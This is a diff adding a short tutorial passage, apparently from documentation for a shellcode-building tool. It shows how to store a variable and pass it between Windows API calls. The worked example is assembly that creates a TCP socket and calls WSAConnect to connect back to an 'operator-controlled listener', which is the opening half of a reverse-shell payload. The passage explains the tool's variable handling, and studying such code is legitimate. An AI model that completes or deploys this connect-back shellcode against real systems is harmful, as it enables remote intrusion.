@@ -1,0 +1,35 @@
+for instance our method returned socket address and we want to pass it to another function,
+at first we must save the result in the variable
+
+v_socket = "socket"
+...
+var.add(v_socket)
+...
+"   call_wsasocketa:                     ",  # create an AF_INET / SOCK_STREAM / IPPROTO_TCP socket
+"       xor eax, eax                    ;",
+"       push eax                        ;",  # dwFlags = NULL
+"       push eax                        ;",  # g = NULL
+"       push eax                        ;",  # lpProtocolInfo = NULL
+"       mov al, 0x06                    ;",
+"       push eax                        ;",  # protocol = 0x06, IPPROTO_TCP
+"       sub al, 0x05                    ;",
+"       push eax                        ;",  # type = 0x01, SOCK_STREAM
+"       inc eax                         ;",
+"       push eax                        ;",  # af = 0x02, AF_INET
+var.call_function(f_wsasocketa),        # socket address is in the EAX register
+var.write_var(v_socket),                # write the content of the EAX register to v_socket
+
+
+then if you need to pass it to another function as a parameter
+
+"   call_wsaconnect:                     ",  # connect the socket back to the operator-controlled listener
+"       xor eax, eax                    ;",
+"       push eax                        ;",  # lpGQOS
+"       push eax                        ;",  # lpSQOS
+"       push eax                        ;",  # lpCalleeData
+"       push eax                        ;",  # lpCallerData
+"       add al, 0x10                    ;",
+"       push eax                        ;",  # namelen = 0x10
+var.push_var_address(v_sockaddr_in),         # *name = ptr to v_sockaddr_in
+var.push_var_value(v_socket),                # <----- our save socket address     
+var.call_function(f_wsaconnect),
